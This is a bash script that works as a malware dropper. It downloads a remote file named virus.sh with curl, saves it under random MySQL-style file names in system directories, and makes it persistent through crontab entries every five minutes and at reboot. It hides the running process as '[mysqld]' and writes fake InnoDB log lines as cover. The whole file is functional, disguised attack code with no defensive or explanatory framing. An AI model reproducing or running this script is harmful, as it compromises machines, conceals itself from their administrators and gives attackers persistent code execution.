#!/bin/bash

GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/him1k0ta/test/main/virus.sh"
MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")

generate_mysql_name() {
    PREFIXES=("ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb")
    RANDOM_PREFIX=${PREFIXES[$RANDOM % ${#PREFIXES[@]}]}
    RANDOM_NUMBER=$((RANDOM % 10000))
    echo "${RANDOM_PREFIX}${RANDOM_NUMBER}"
}

find_mysql_dir() {
    for dir in "${MYSQL_DIRS[@]}"; do
        mkdir -p "$dir" 2>/dev/null
        if [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    mkdir -p "/tmp/mysql" 2>/dev/null
    echo "/tmp/mysql"
}

hide_process() {
    exec -a "[mysqld]" "$SCRIPT_PATH" 2>/dev/null &
}

main() {
    MYSQL_DIR=$(find_mysql_dir)
    RANDOM_NAME=$(generate_mysql_name)
    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
    
    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
        
        (crontab -l 2>/dev/null
         echo "*/5 * * * * $SCRIPT_PATH >/dev/null 2>&1"
         echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
        ) | crontab -
    fi
    
    hide_process
    
    while true; do
        echo "$(date) [Note] InnoDB: Checksum" >> "$MYSQL_DIR/mysql.log" 2>/dev/null
        sleep $((60 + RANDOM % 60))
    done &
}

main